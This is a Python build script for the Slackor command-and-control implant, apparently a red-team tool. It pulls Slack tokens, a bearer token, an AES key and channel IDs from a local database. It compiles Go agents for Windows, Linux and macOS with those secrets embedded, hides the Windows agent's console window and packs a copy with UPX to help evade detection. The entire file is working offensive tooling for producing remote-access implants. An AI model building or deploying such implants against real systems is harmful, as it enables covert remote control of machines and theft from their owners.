import random
import sqlite3
import hashlib
import subprocess

conn = sqlite3.connect('slackor.db')

# Connect to database and get keys
auths = conn.execute("SELECT * FROM KEYS")
for row in auths:
    token = row[1]
    bearer = row[2]
    aes_key = row[3]

# Connect to database and get channels
channels = conn.execute("SELECT * FROM CHANNELS")
for row in channels:
    commands = row[1]
    responses = row[2]
    registration = row[3]

conn.close()

# Build exe and pack with UPX
subprocess.run(["bash", "-c", "GOOS=windows GOARCH=amd64 go build -o agent.windows.exe -ldflags \"-s -w -H windowsgui -X github.com/Coalfire-Research/Slackor/internal/config.ResponseChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.RegistrationChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.CommandsChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.Bearer=%s -X github.com/Coalfire-Research/Slackor/internal/config.Token=%s -X github.com/Coalfire-Research/Slackor/internal/config.CipherKey=%s -X github.com/Coalfire-Research/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
subprocess.run(["bash", "-c", "cp -p agent.windows.exe agent.upx.exe"])
subprocess.run(["bash", "-c", "upx --force agent.upx.exe"])

# Build for linux and macOS
subprocess.run(["bash", "-c", "GOOS=linux GOARCH=amd64 go build -o agent.64.linux -ldflags \"-s -w -X github.com/Coalfire-Research/Slackor/internal/config.ResponseChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.RegistrationChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.CommandsChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.Bearer=%s -X github.com/Coalfire-Research/Slackor/internal/config.Token=%s -X github.com/Coalfire-Research/Slackor/internal/config.CipherKey=%s -X github.com/Coalfire-Research/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
subprocess.run(["bash", "-c", "GOOS=linux GOARCH=386 go build -o agent.32.linux -ldflags \"-s -w -X github.com/Coalfire-Research/Slackor/internal/config.ResponseChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.RegistrationChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.CommandsChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.Bearer=%s -X github.com/Coalfire-Research/Slackor/internal/config.Token=%s -X github.com/Coalfire-Research/Slackor/internal/config.CipherKey=%s -X github.com/Coalfire-Research/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
subprocess.run(["bash", "-c", "GOOS=darwin GOARCH=amd64 go build -o agent.darwin -ldflags \"-s -w -X github.com/Coalfire-Research/Slackor/internal/config.ResponseChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.RegistrationChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.CommandsChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.Bearer=%s -X github.com/Coalfire-Research/Slackor/internal/config.Token=%s -X github.com/Coalfire-Research/Slackor/internal/config.CipherKey=%s -X github.com/Coalfire-Research/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])

# Print hashes
filenames = ["agent.windows.exe", "agent.upx.exe", "agent.64.linux", "agent.32.linux", "agent.darwin"]
for filename in filenames:
    # TODO: use buffers/hash update if the agent ever gets big
    f = open(filename, 'rb').read()
    h = hashlib.sha256(f).hexdigest()
    print(h + "  " + filename)
